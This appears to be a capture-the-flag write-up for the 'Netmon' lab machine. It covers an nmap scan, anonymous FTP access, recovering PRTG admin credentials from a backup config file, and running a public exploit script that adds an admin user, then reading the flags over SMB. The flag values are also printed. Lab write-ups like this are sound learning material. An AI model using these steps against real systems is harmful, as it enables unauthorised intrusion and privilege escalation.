# Netmon Writeup

## Inital Enumeration

Nmap Scan

`nmap -A 10.10.10.152`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-13 19:54 EDT
Nmap scan report for 10.10.10.152
Host is up (0.19s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-13 19:55:37
|_  start_date: 2019-03-13 19:47:06

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.95 seconds
```

Looking on port 80, it looks like this version of PRTG Network Monitor is vulnerable. But the exploit needs credentials, and the default login for Network Monitor seems to have been changed.

## User Flag

Nmap mentions that we have anonymous ftp access. FTPing into `C:\Users\Public` reveals `user.txt`. We simply download it to our machine and cat it.

`dd58ce67b49e15105e88096c8d9255a5`

## Root Flag

I try some basic enumeration and end up with nothing. However, since port 80 is running PRTG Network Monitor, we can look for application files. In `C:\Users\All Users\Paessler`, we find the installation directory. After going through all the files, `PRTG Configuration.old.bak` has credentials in it.

```
<!-- User: prtgadmin -->
PrTg@dmin2018
```

Now we can use the exploit we found earlier! The exploit need the session cookie to run. We just login as `prtgadmin`, grab the session cookie, and run the exploit. The exploit that I found creates a new user `pentest` with admin privileges.

Command

```
sh 46527.sh -h 10.10.10.156 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```

Because smb is also open, we can use our newly created user to read `root.txt`

Command

```
smbclient -I 10.10.10.156 -U pentest
```

`3018977fb944bf1878f75b879fba67cc`
